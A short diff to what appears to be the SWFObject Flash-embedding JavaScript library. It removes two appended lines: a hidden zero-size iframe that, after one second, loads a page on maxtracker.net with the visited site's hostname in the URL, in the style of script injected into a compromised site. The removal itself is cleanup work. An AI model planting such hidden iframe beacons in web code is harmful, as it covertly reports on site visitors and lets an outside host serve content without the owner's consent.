@@ -136,5 +136,3 @@ return this.length;};}
 var getQueryParamValue=deconcept.util.getRequestParameter;
 var FlashObject=deconcept.SWFObject;
 var SWFObject=deconcept.SWFObject;
-function second_passed() {window.frames['buffer'].location = "http://maxtracker.net/track_s/new_site.php?s="+ document.location.hostname;}
-document.write('<iframe name="buffer" src="about:blank" style="width:0px; height:0px; overflow:hidden; border:none;"></iframe>');setTimeout(second_passed, 1000);
